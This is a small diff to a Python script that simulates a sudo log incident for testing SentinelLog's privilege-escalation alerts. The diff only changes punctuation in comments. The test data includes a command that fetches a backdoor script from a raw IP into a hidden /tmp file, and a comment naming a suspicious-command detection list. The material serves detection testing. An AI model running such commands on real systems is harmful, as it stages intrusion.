@@ -1,7 +1,7 @@
 """
 SentinelLog privilege-escalation simulation (sudo log type).
 
-Writes a realistic incident to a sudo-style log — normal, boring admin
+Writes a realistic incident to a sudo-style log - normal, boring admin
 work from trusted users, then an unexpected account running sudo, then
 a couple of genuinely dangerous commands (reverse shell staging, reading
 /etc/shadow, a wide-open chmod). Each unique user/command pair fires its
@@ -31,16 +31,16 @@ def next_time(seconds):
     _t[0] = _t[0] + timedelta(seconds=seconds)
     return _t[0]
 
-# ── Phase 1: normal admin work from trusted accounts — should NOT alert ──
+# ── Phase 1: normal admin work from trusted accounts - should NOT alert ──
 events.append((line(next_time(0), "ibrahim", "/usr/bin/apt update"), 1.0))
 events.append((line(next_time(2), "root", "/usr/bin/systemctl restart nginx"), 1.0))
 events.append((line(next_time(2), "deploy", "/usr/bin/systemctl status app.service"), 1.0))
 
-# ── Phase 2: an account nobody recognizes shows up and runs sudo at all —
+# ── Phase 2: an account nobody recognizes shows up and runs sudo at all -
 #    fires on "unexpected user" alone, regardless of the command.
 events.append((line(next_time(3), "www-data", "/usr/bin/whoami"), 1.5))
 
-# ── Phase 3: genuinely dangerous commands — each fires its own alert,
+# ── Phase 3: genuinely dangerous commands - each fires its own alert,
 #    matching SUSPICIOUS_COMMANDS (wget, /bin/bash, /etc/shadow, chmod).
 #    Each gets its own second so alert IDs never collide.
 events.append((line(next_time(2), "guest", "/usr/bin/wget http://45.155.205.90/backdoor.sh -O /tmp/.x"), 1.5))
